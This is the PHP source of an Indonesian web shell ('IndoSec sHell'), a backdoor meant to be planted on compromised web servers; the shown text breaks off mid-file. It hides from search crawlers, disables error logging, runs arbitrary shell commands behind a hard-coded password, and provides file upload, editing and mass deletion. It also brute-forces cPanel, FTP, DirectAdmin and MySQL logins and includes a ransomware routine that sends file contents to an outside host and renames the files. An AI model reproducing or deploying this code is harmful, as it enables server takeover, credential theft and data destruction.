<?php

/*
	* Konsep Shell : Brillyan -Founder { IndoSec }-
	* Pembuat : Rizsyad AR - { IndoSec }
	
	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
	* Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
	

	* Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya

	* { IndoSec sHell }
	* @2022 { IndoSec } -Rizsyad AR-
	* Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/tidak responsive harap dimaklumi.  V 0.1
*/

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

session_start();
error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@ini_set('magic_quotes_runtime', 0);
@ini_set('memory_limit', '-1');
@ini_set("upload_max_filesize", "9999m");
@ini_set('zlib.output_compression', 'Off');
@ini_restore('safe_mode');
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
@ini_restore("open_basedir");

/* Configurasi */
$aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
$_SESSION["password"] 	= $aupas;
$isLocal 				= ($_SERVER['HTTP_HOST'] === "localhost" || in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1']));
$BASE_URL				= $isLocal ? "http://localhost/www/percobaan/ids-shell" : "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main";

function curlRequest($url)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}

// mendapatkan content page
function getContentPage($page, $search = "", $replace = "") 
{
	global $BASE_URL;

	$url = "$BASE_URL/page/$page.html";

	$content = (curlRequest($url) ?? file_get_contents($url));

	if($search != "" && $replace != "") {
		echo str_replace($search, $replace, $content);
		return;
	}

	echo $content;
}

// mendapatkan file image
function getImageUrl($ext) 
{
	global $BASE_URL;
    return "$BASE_URL/assets/img/$ext.png";
}

function image($ext, $attr) {
	return "<img src='".getImageUrl($ext)."' onerror=\"this.src='".getImageUrl("file")."';\" $attr loading='lazy'/>";
}

function check($password)
{
    return (md5($password) === $_SESSION["password"]);
}

function download($file)
{
    @ob_clean();
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}

function w($dir,$perm)
{
    return !is_writable($dir) ? "<font color='red'>".$perm."</font>" : "<font color='lime'>".$perm."</font>";
}

function exe($cmd)
{
	$buff = '';
	$cmd .= " 2>&1";

	if(function_exists('system'))
    {
		@ob_start();
		@system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
	} 
    elseif(function_exists('exec'))
    {
		@exec($cmd,$results);
		$buff = @join("\n",$results);
	} 
    elseif(function_exists('passthru'))
    {
		@ob_start();
		@passthru($cmd);
        $buff = @ob_get_contents();
		@ob_end_clean();
	} 
    elseif(function_exists('shell_exec'))
    {
		$buff = @shell_exec($cmd);
	}
	elseif(function_exists('proc_open'))
	{
		$desc = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "w")
		);

		$proc = @proc_open($cmd, $desc, $pipes, getcwd(), array());
		if(is_resource($proc)) {
			while($res = fgets($pipes[1])) { if(!empty($res)) $buff .= $res; }
			while($res = fgets($pipes[2])) { if(!empty($res)) $buff .= $res; }
		}
		@proc_close($proc);
	}
	elseif(function_exists('popen'))
	{
		$res = @popen($cmd, 'r');
		if($res) {
			while(!feof($res)) { $buff .= fread($res, 2096); }
			pclose($res);
		}
	}
	return $buff;
}

function perms($file)
{
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000){
		// Socket
		$info = 's';
	}elseif (($perms & 0xA000) == 0xA000){
		// Symbolic Link
		$info = 'l';
	}elseif (($perms & 0x8000) == 0x8000){
		// Regular
		$info = '-';
	}elseif (($perms & 0x6000) == 0x6000){
		// Block special
		$info = 'b';
	}elseif (($perms & 0x4000) == 0x4000){
		// Directory
		$info = 'd';
	}elseif (($perms & 0x2000) == 0x2000){
		// Character special
		$info = 'c';
	}elseif (($perms & 0x1000) == 0x1000){
		// FIFO pipe
        $info = 'p';
	}else{
		// Unknown
		$info = 'u';
	}

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));

	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
		
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

function formatSize( $bytes ){
	$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
	for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
	return( round( $bytes, 2 )." ".$types[$i] );
}

function formatSize1( $bytes ){
	return( round( $bytes, 2 ) );
}

function ambilKata($param, $kata1, $kata2)
{
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

function swall($title, $text, $type, $dir)
{
    echo "
	<script>
    Swal.fire({
        title: '$title',
        text: '$text',
        icon: '$type',
    }).then((value) => {
        window.location = '$dir';
    })
	</script>
    ";
}

function setCookies($name, $value)
{
	return setCookie($name, $value, time()+3600, '/');
}

function getCookie($name)
{
	return $_COOKIE[$name];
}

function countDomain() 
{
	global $d0mains;
    if (!$d0mains) return "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";

    $count = 0;
	foreach ($d0mains as $d0main) {
		if (@strstr($d0main, "zone")){
			preg_match_all('#zone "(.*)"#', $d0main, $domains);
			flush();
			if (strlen(trim($domains[1][0])) > 2){
				flush();
				$count++;
			}
		}
	}

	return $count;
}

function login_shell()
{
	getContentPage("login");
}

function zipFile($data, $dir, $type)
{
	if(!function_exists('ZipArchive') && !extension_loaded('zip')) return false;

	$zip = new ZipArchive();

	if($type === "zip")
	{
		if(!file_exists($data)) return false;

		$data = realpath($data);
		$zip->open(basename($dir).".zip", ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);

		if(is_file($data)) $zip->addFromString(basename($data), file_get_contents($data));

		if(is_dir($data)) {
			$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($data), RecursiveIteratorIterator::SELF_FIRST);
			foreach ($files as $file) {
				$file = realpath($file);
				if(is_file($file)) {
					$zip->addFromString(str_replace($data . '/', '', $file), file_get_contents($file));
				}
			}
		}
	}
	else
	{
		$res = $zip->open($data);
		if(!$res) return false;

		$name = basename($data, ".zip")."_unzip";
		@mkdir($name);
		@$zip->extractTo($dir."/".$name);
	}

	@$zip->close();
	return true;
}

function breadcrumb($page)
{
	$li = "";
	$exclude = array("files", "mass", "tools");

	for ($i=0; $i < count($page); $i++) { 
		$pages = strtolower(preg_replace('/\s+/', '', $page[$i]));

		if($i+1 === count($page)) $li .= "<li class='active'>".$page[$i]."</li>";
		else if(in_array($pages, $exclude)) $li .= '<li><a href="#">'.$page[$i].'</a></li>';
		else $li .= '<li><a href="?page='.$pages.'">'.$page[$i].'</a></li>';
	}

	echo '<div class="breadcrumbs">
    <div class="col-sm-4">
      <div class="page-header float-left">
        <div class="page-title">
          <h1>Dashboard</h1>
        </div>
      </div>
    </div>
    <div class="col-sm-8">
      <div class="page-header float-right">
        <div class="page-title">
          <ol class="breadcrumb text-right">
            '.$li.'
          </ol>
        </div>
      </div>
    </div>
  </div>';
}

function template($page, $bc, $search, $replace)
{
	
	getContentPage("components/header");
	getContentPage("components/sidebar");
	getContentPage("components/rightpanel");
	
	breadcrumb($bc);
	getContentPage($page, $search, $replace);
	getContentPage("components/footer", $search, $replace);
}

function pages($page, $bc, $search = "", $replace = "")
{
	template($page, $bc, $search, $replace);
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
	if(!isset($_POST['pass']) || !check($_POST['pass'])) return login_shell();
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = TRUE;
	
}

if(isset($_GET['path'])){
	$path = $_GET['path'];
	chdir($path);
} else {
	$path = getcwd();
}

$path 			= @str_replace('\\','/',$path);
$paths 			= explode('/',$path);
$os 			= php_uname();
$ip 			= getHostByName(getHostName());
$ver 			= phpversion();
$web 			= $_SERVER['HTTP_HOST'];
$sof 			= $_SERVER['SERVER_SOFTWARE']; 
$curl 			= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$mail 			= (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$sm 			= (function_exists('safe_mode')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$zip 			= (!function_exists('ZipArchive') && !extension_loaded('zip')) ? "<font color=red>NONE</font>" :  "<font color=green>ON</font>";
$total 			= disk_total_space($path);
$free 			= disk_free_space($path);
$usage			= (formatSize1($total)-formatSize1($free));
$ds 			= @ini_get("disable_functions");
$apachemodul 	= (function_exists("apache_get_modules")) ? implode(', ', apache_get_modules()) : "<font color=red>NONE</font>";
$show_ds 		= (!empty($ds)) ? "<a href='#'>$ds</a>" : "<font color=green>NONE</font>";
$d0mains 		= @file("/etc/named.conf", false);

$supportDB = array();
if(function_exists('mysqli_get_client_info') || function_exists('mysql_get_client_info')) $supportDB[] = "MySQL / MySQLi (".mysqli_get_client_info().")";
if(function_exists('mssql_connect')) $supportDB[] = "MSSQL";
if(function_exists('pg_connect')) $supportDB[] = "PostgreSQL";
if(function_exists('oci_connect')) $supportDB[] = "Oracle";
$supportDB = implode(', ', $supportDB);

function printPath()
{
	global $paths;
	global $path;
	global $page;
	$ph = "";

	foreach($paths as $id => $pat){
		if($pat == '' && $id == 0){			
			$ph .= "<a href='?page=$page&path=/'>/</a>";
			continue;
		} if($pat == '') continue;
		$ph .= "<a style='word-wrap:break-word;' href='?page=$page&path=";
		for($i=0;$i<=$id;$i++){
			$ph .= "$paths[$i]";
			if($i != $id) $ph .= "/";
		}
		$ph .= "'>".$pat."</a>/";
	}
	$ph .= " [".w($path, perms($path))."]";

	return $ph;
}

function current_path($pages = "", $paths = ""){
	global $path;
	global $page;

	$page = $pages ? $pages : $page;
	$path = $paths ? $paths : $path;

	return "?page=$page&path=$path";
}

function isImage($name) {
	$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
	return preg_match('/(jpg|png|gif|jpeg|gif)$/i', $ext, $matches, PREG_OFFSET_CAPTURE, 0);
}

function actionMultiDelete($dir) {

	if(is_writable($dir)) {
		$paths = scandir($dir);

		foreach ($paths as $path) {
			if($path == "." || $path == "..") continue;
			$dirs = "$dir/$path";

			if(!is_dir($dirs)) @unlink($dirs);

			if(is_dir($dirs) && is_readable($dirs)) {
				@rmdir($dirs);
				@exe("rm -rf $dirs");
				@exe("rmdir /s /q $dirs");
			}
		}
		return true;
	}
	return false;
}

function curlPostGetRankDAPA($url)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://v1.exploits.my.id:1337/?tools=dapa");
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "url=$url&pa=pa&go=Gaskan");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
	curl_setopt($ch, CURLOPT_REFERER, "https://www.google.com");
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}

function getRankDAPA() {
	// check is running in localhost?
	global $isLocal;

	if($isLocal) return;

	$url 		= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
	$content 	= curlPostGetRankDAPA($url);

	preg_match_all("/<oren>(.*?)<\/oren>:(.*?\S\s)/m", $content, $match, PREG_SET_ORDER, 0);

	$data["DA"] = $match[0][2];
	$data["PA"] = $match[1][2];

	return $data;
}

function getRankAlexa() {
	// check is running in localhost?
	global $isLocal;

	if($isLocal) return;

	$url 		= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
	$content 	= simplexml_load_file("http://data.alexa.com/data?cli=10&url=$url");
	
	if(!$content->SD) return;

	$data['global_rank'] 	= (int) $content->SD->POPULARITY->attributes()->TEXT;
	$data['local_rank'] 	= (int) $content->SD->COUNTRY->attributes()->RANK;
	$data['country'] 		= $content->SD->COUNTRY->attributes()->NAME;

	return $data;
}

function curlRequestCrack($info)
{
	$options 	= array();
	$ch 		= curl_init();

	if($info["login"] == "cp") $url = $info['protocol'].$info['url'].':'.$info['port'];
	if($info["login"] == "ftp") $url = $info['protocol'].$info['url'];
	if($info["login"] == "DirectAdmin") $url = $info['protocol'].$info['url'].':'.$info['port'].'/CMD_LOGIN';
	if($info["login"] == "DirectAdminMysql") $url = $info['protocol'].$info['url'].'/phpmyadmin';

	$options["CURLOPT_URL"] = $url;
	$options["CURLOPT_USERAGENT"] = "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0";
	$options["CURLOPT_RETURNTRANSFER"] = 1;
	if($info["login"] == "ftp" || $info["login"] == "DirectAdmin" || $info["login"] == "DirectAdminMysql") {
		$options["CURLOPT_USERPWD"] = $info["username"].":".$info["password"];
	}
	if($info["login"] == "cp" || $info["login"] == "DirectAdmin" || $info["login"] == "DirectAdminMysql") {
		$options["CURLOPT_SSL_VERIFYPEER"] = 0;
		$options["CURLOPT_SSL_VERIFYHOST"] = 0;
		$options["CURLOPT_HEADER"] = 0;
		$options["CURLOPT_FOLLOWLOCATION"] = 1;
	}
	if($info["login"] == "cp") {
		$options["CURLOPT_HTTPHEADER"] = array("Authorization: Basic ". base64_encode($info["username"].":".$info["password"]));
	}
	if($info["login"] == "DirectAdminMysql") {
		$options["CURLOPT_HTTPAUTH"] = CURLAUTH_ANY;
	}
	curl_setopt_array($ch, $options);
	$result = @curl_exec($ch);
	$curl_errno = curl_errno($ch);
	$curl_error = curl_error($ch);
	curl_close($ch);

	if ($curl_errno > 0) {return "<font color='red'>Error: $curl_error</font><br>";}
	else if(preg_match('/CMD_FILE_MANAGER|frameset/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
	else if(preg_match('/filemanager/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
	else if(preg_match('/(\d+):(\d+)/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
	
}

function curlRequestRansom($content, $key)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://ransom.rizsyad.repl.co");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "content=$content&action=enc&key=$key");
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

function crackFunctionLogin($info){
	if($info["login"] == "mysqli_connect")
	{
		if(@mysqli_connect($info['url'].':'.$info['port'],$info['username'],$info['password']))
		{
			return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
		}
	} 
	
	if($con=@ftp_connect($info['url'],$info['port']))
	{
		$login=@ftp_login($con,$info['username'],$info['password']);
		if($login) return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
	}
}

function searchString($method, $dir, $string, $ext, $exclude, &$output = array())
{
	if(is_dir($dir)) {
		$files = scandir($dir);
		foreach($files as $file) {
			$path = realpath($dir.DIRECTORY_SEPARATOR.$file);
			
			if($file == "." || $file == ".." || in_array($file, array_map("trim", explode(",", $exclude)))) continue;
			if(is_dir($path)) searchString($method, $path, $string, $ext, $exclude, $output);
				
			if($ext != "*") {
				$getExtension = strtolower(pathinfo($path, PATHINFO_EXTENSION));
				if(strtolower($ext) != $getExtension) continue;
			}
	
			if($method == "fsf") {
				$content = file_get_contents($path);
				if(strpos($content, $string) !== false) $output[] = str_replace('\\','/',$path);
			} else {
				if(strstr($file, $string)) $output[] = str_replace('\\','/',$path);
			}
		}
	}
	return $output;
}

function ransom($dir, $key, &$output = array())
{
	$exclude = basename(__FILE__).", ";

		
	if(is_dir($dir)) {
		$scdir = scandir($dir);
		foreach($scdir as $file) {
			$path = realpath($dir.DIRECTORY_SEPARATOR.$file);
			
			if($file == "." || $file == ".." || in_array($file, array_map("trim", explode(",", $exclude)))) continue;
			if(is_dir($path)) ransom($path, $key, $output);

			$contentFile = file_get_contents($path);
			$base64 = base64_encode($contentFile);
			$result = json_decode(curlRequestRansom($base64, $key));

			if($result->status == "success") {
				if(is_dir($path)) continue;

				if(rename($path, $path. ".indsc")) {
					file_put_contents($path. ".indsc", $result->data);
					$output[] = "[+] <i class='fa-solid fa-lock'></i> $path => Success Encrypted <br>";
				} else {
					$output[] = "[+] <i class='fa-solid fa-lock'></i> $path => Failed Encrypted <br>";
				}
			}
		}
	}
	return $output;
}

function newfile(){

	global $path;

	pages("newfile", ["Files", "File Manager", "New File"]);

	if(isset($_POST["bikin"]))
	{
		$name = $_POST['nama_file'];
		$isi_file = $_POST['isi_file'];

		$handle = @fopen("$path/$name", "w");
		$buat = @fwrite($handle, $isi_file);
		if($buat) return swall("Success", "Berhasil Membuat File", "success", current_path("filemanager", $path));

		return swall("Success","Gagal Membuat File", "success", current_path("filemanager", $path));
	}
}

function newfolder(){

	global $path;

	pages("newfolder", ["Files", "File Manager", "New Folder"]);

	if(isset($_POST["bikin"]))
	{
		$name = $_POST['nama_folder'];
		$fd = @mkdir($name);
		if($fd) return swall("Success", "Berhasil Membuat Folder", "success", current_path("filemanager", $path));

		return swall("Success","Gagal Membuat Folder", "success", current_path("filemanager", $path));
	}
}

function viewfile()
{
	global $path;
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

	if(isImage($path)) {
		$content = "<br/><img src='data:image/$ext;base64,".base64_encode(@file_get_contents($path))."' class='img-fluid mt-3'  />";
	} else {
		$content = '<textarea rows="13" class="form-control mt-3" disabled="">'.htmlspecialchars(@file_get_contents($path)).'</textarea>';
	}
	
	$name = basename($path);
	$namefile = image($ext, "style='width: 25px;'")." ".$name;
	
	pages("viewfile", ["Files", "File Manager", "View File"], array("{{CONTENTFILE}}", "{{NAMEFILE}}"), array($content, $namefile));
}

function renameF()
{
	global $path;

	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
	$name = basename($path);
	$namefile = image($ext ? $ext : 'folder', "style='width: 25px;'")." ".$name;

	pages("renamefile", ["Files", "File Manager", "Rename ".($ext ? "File" : 'Folder')], array("{{NAMEFILE}}", "{{NAME}}"), array($namefile, $name));

	if(isset($_POST['rename']))
	{
		$baru = $_POST['new'];

		if(file_exists(dirname($path)."/".$baru)) return swall("Error", "Nama $baru Telah Digunakan", "error",  current_path("filemanager", $path));
		$ubah = rename($path, dirname($path)."/".$baru);

		if($ubah) return swall("Success", "Berhasil Mengganti Nama Menjadi $baru", "success",  current_path("filemanager", dirname($path)));
		swall("Error", "Gagal Mengganti Nama", "error", current_path("filemanager", dirname($path)));
	}
}

function editF()
{
	global $path;

	$content = '<textarea rows="13" class="form-control mt-3 mb-3" name="isi">'.htmlspecialchars(@file_get_contents($path)).'</textarea>';
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
	$name = basename($path);
	$namefile = image($ext, "style='width: 25px;'")." ".$name;
	
	pages("edit", ["Files", "File Manager", "Edit File"], array("{{CONTENTFILE}}", "{{NAMEFILE}}"), array($content, $namefile));

	if(isset($_POST['edit']))
	{
		$updt = fopen($path, "w");
		$hasil = fwrite($updt, $_POST['isi']);
		if ($hasil) return swall("Success", "Berhasil Update File", "success", current_path("filemanager", dirname($path)));
		return swall("Error", "Gagal Update File", "error", current_path("filemanager", dirname($path)));
	}
}

function chmods()
{
	global $path;

	$name = basename($path);
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
	$namefile = image($ext ? $ext : 'folder', "style='width: 25px;'")." Chmod ".($ext ? "File" : 'Folder')." : ".$name;
	$perms = substr(sprintf('%o', fileperms($path)), -4);

	pages("chmod", ["Files", "File Manager", "Chmod ".($ext ? "File" : 'Folder')], array("{{FILEPERMS}}", "{{NAMEFILE}}"), array($perms, $namefile));

	if(isset($_POST['chmo'])){
		if(@chmod($path,$_POST['perm'])) return swall("Success", "Change Permission Berhasil", "success", current_path("filemanager", dirname($path)));
		return swall("Error", "Change Permission Gagal", "error", current_path("filemanager", dirname($path)));
	}
}

function upload(){
	global $path;

	$ph = printPath();
	$dir_current = current_path();

	pages("upload", ["Files", "Upload Files"], array("{{PATH}}"), array($ph));

	if(isset($_POST["upload"])) {
		$jumlah = count($_FILES['file']['name']);
		for($i=0; $i < $jumlah;$i++){
			$filename = $_FILES['file']['name'][$i];
			$up = @copy($_FILES['file']['tmp_name'][$i], "$path/".$filename);
		}
		if($jumlah > 1) return swall("Success", "Berhasil Upload $jumlah File", "success", $dir_current);
		if($up) return swall("Success", "Berhasil Upload $filename", "success", $dir_current);
		
		swall("Error", "Gagal Upload File", "error", $dir_current);
	}
}


function hapus() {
	global $path;

	pages("blank", [""]);

	if(is_dir($path) && is_readable($path) ) {
		if(@rmdir($path) || @exe("rm -rf $path") || @exe("rmdir /s /q $path")) return swall("Success", "Berhasil Menghapus", "success",  current_path("filemanager", dirname($path)));
	}

	if(unlink($path)) return swall("Success", "Berhasil Menghapus", "success",  current_path("filemanager", dirname($path)));

	return swall("Error", "Gagal Menghapus", "error",  current_path("filemanager", dirname($path)));
}

function mdelete()
{
	global $path;

	pages("massdelete", ["Mass", "Mass Delete"], array("{{PATH}}", "{{IMG}}"), array($path, image('folder', 'style="width: 25px;"')));

	if(isset($_POST["delete"]))
	{
		$spath = $_POST["d_dir"];

		if(actionMultiDelete($spath)) return swall("Success", "Berhasil Multi Menghapus", "success",  current_path("mdelete"));
		return swall("Error", "Gagal Multi Menghapus", "error",  current_path("mdelete"));
	}
}

function filemanager()
{
	global $path;
	global $page;

	$ph = printPath();
	$fm = "";

	$scandir = scandir($path);

	foreach ($scandir as $dir) {

		if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;

		$dtime = date("l d/m/y G:i", filemtime("$dir/"));

		if (strlen($dir) > 18) {
			$_dir = substr($dir, 0, 18)."...";
		} else {
			$_dir = $dir;
		}

		$fm .= "<tr>
			<td>
				".image("folder", "style='width: 25px;'")."
				<a href='?page=$page&path=$path/$dir'>$_dir</a>
			</td>
			<td>--</td>
			<td>$dtime</td>
			<td>".mime_content_type("$path/$dir")."</td>
			<td><a title='chmod' href='?page=chmod&path=$path/$dir'>".w("$path/$dir", perms("$path/$dir"))."</a></td>
			<td class='text-white d-flex'>
				<a title='Rename' class='badge badge-success ml-2' href='?page=rename&path=$path/$dir'><i class='fa fa-pen'></i></a>
				<a title='Delete' class='badge badge-danger ml-2' href='?page=delete&path=$path/$dir'><i class='fa fa-trash'></i></a>
			</td>
		</tr>";
	}

	foreach($scandir as $file) {

		if(!is_file($path.'/'.$file)) continue;

		$dtime = date("l d/m/y G:i", filemtime("$path/$file"));
		$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));

		if (strlen($file) > 25){
			$_file = substr($file, 0, 25)."...-.".$ext;												
		} else {
			$_file = $file;
		}

		$fm .= "<tr>
			<td>
				".image($ext, "style='width: 25px;'")."
				<a href='?page=viewfile&path=$path/$file'>$_file</a>
			</td>
			<td>".formatSize(filesize($file))."</td>
			<td>$dtime</td>
			<td>".mime_content_type("$path/$file")."</td>
			<td><a title='chmod' href='?page=chmod&path=$path/$file'>".w("$path/$file", perms("$path/$file"))."</a></td>
			<td class='text-white d-flex'>
				<a title='Lihat' class='badge badge-info ml-2' href='?page=viewfile&path=$path/$file'><i class='fa fa-eye'></i></a>
				<a title='Edit' class='badge badge-success ml-2' href='?page=edit&path=$path/$file'><i class='far fa-edit'></i></a>
				<a title='Rename' class='badge badge-success ml-2' href='?page=rename&path=$path/$file'><i class='fa fa-pen'></i></a>
				<a title='Delete' class='badge badge-danger ml-2' href='?page=delete&path=$path/$file'><i class='fa fa-trash'></i></a>
				<a title='Download' class='badge badge-primary ml-2' href='?page=download&path=$path/$file'><i class='fa fa-download'></i></a>
			</td>
		</tr>";
	}

	$button = "<div class='d-flex mt-3'><a class='btn btn-primary btn-sm text-white mr-3' href='?page=newfile&path=$path'>Tambah File</a><a class='btn btn-primary btn-sm text-white mr-3' href='?page=newfolder&path=$path'>Tambah Folder</a></div>";

	pages("filemanager", ["Files", "File Manager"], array("{{PATH}}", "{{FILEMANAGER}}", "{{BUTTON}}"), array($ph, $fm, $button));
}

function downloadAdminer()
{
	$content = curlRequest("https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/includes/adminer.php");
	$fp 	= @fopen("adminer.php", "w");
	$buat 	= @fwrite($fp, $content);
	fclose($fp);
	return $buat;
}

function adminer()
{
	global $path;

	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);

	if (file_exists("adminer.php")) $output = "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
	else if (downloadAdminer()) $output = "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
	else $output = "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";

	pages("adminer", ["Tools", "Adminer"], array("{{OUTPUT}}"), array($output));
}

function backup() {
	
	global $path;

	pages("backup", ["Files", "Backup"], array("{{PATHZIP}}", "{{PATH}}"), array("$path.zip", $path));

	if(isset($_POST["upnun"])) {
		$filename 	= $_FILES["zip_file"]["name"];
		$tmp 		= $_FILES["zip_file"]["tmp_name"];

		if(!move_uploaded_file($tmp, "$path/$filename")) return swall("Error", "Gagal Upload Zip", "error", current_path("backup"));

		if(!zipFile($filename, $path, "extract")) {
			swall("Error", "Gagal Mengekstrak Zip", "error", current_path("backup"));
			unlink($filename);
			return;
		}
		
		unlink($filename);

		return swall("Success", "Success Mengekstrak Zip", "success", current_path("backup"));
	}

	if(isset($_POST["backup"])) {
		$fol = $_POST['folder'];

		if(!zipFile($fol, $fol, "zip")) return swall("Error", "Gagal Mengkompres Zip", "error", current_path("backup"));
		return swall("Success", "Success Mengkompres Zip", "success", current_path("backup"));
	}

	if(isset($_POST["extrak"])) {
		$zip = $_POST["file_zip"];

		if(!zipFile($zip, $path, "extract")) return swall("Error", "Gagal Mengekstrak Zip", "error", current_path("backup"));
		return swall("Success", "Success Mengekstrak Zip", "success", current_path("backup"));
	}

}

function dashboard() {

	global $ver;
	global $ip;
	global $supportDB;
	global $curl;
	global $mail;
	global $show_ds;
	global $sof;
	global $os;
	global $usage;
	global $apachemodul;
	global $sm;
	global $zip;
	global $free;
	global $total;

	$rank = getRankAlexa();
	$rankDAPA = getRankDAPA();

	$arrFind = [
		"{{countDomain}}", 
		"{{PHPVERSION}}", 
		"{{IPSERVER}}",
		"{{SUPPORTDB}}",
		"{{CURL}}",
		"{{MAILER}}",
		"{{DF}}",
		"{{SOFT}}",
		"{{OS}}",
		"{{FREEUSAGE}}",
		"{{USAGE}}",
		"{{TOTALUSAGE}}",
		"{{APACHE}}",
		"{{SM}}",
		"{{ZIP}}",
		"{{RANKGLOBAL}}",
		"{{COUNTRY}}",
		"{{RANKCOUNTRY}}",
		"{{DARANK}}",
		"{{PARANK}}"
	];

	$arrReplace = [ 
		countDomain(), 
		$ver, 
		$ip,
		$supportDB,
		$curl,
		$mail,
		$show_ds,
		$sof,
		$os." [<a href='https://www.exploit-db.com/search?q=".php_uname('s')."+Kernel+".php_uname('r')."' target='_blank' rel='noreferrer'>Exploit DB</a>] ",
		formatSize1($free),
		$usage,
		"Total: ".formatSize($total),
		$apachemodul,
		$sm,
		$zip,
		$rank['global_rank'],
		$rank['country'],
